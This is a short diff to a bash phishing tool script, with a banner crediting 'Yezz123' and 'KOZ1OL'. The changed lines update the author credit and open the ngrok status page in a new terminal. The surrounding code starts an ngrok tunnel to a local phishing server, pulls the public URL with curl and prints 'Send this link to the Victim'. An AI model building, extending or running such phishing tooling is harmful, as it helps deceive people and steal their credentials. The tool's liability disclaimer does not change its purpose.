@@ -119,7 +119,7 @@ printf "\e[1;77m █    ▄▄▄█   ▄   █   █▄▄▄▄▄  █   ▄
 printf "\e[1;77m █   █   █  █ █  █   █▄▄▄▄▄█ █  █ █  █   █▄▄▄█   █  █ █ \e[0m\n"
 printf "\e[1;77m █▄▄▄█   █▄▄█ █▄▄█▄▄▄█▄▄▄▄▄▄▄█▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄█  █▄█ V:1.2 \e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: Yezz123 \e[0m\e[1;93m.:.:.\e[0m\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: Yezz123 and upgraded by KOZ1OL \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Phisher take care please !::\e[0m\n"
@@ -337,7 +337,7 @@ sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 5
-firefox 127.0.0.1:4040/status
+gnome-terminal --window --title=NGROK -- firefox 127.0.0.1:4040/status
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
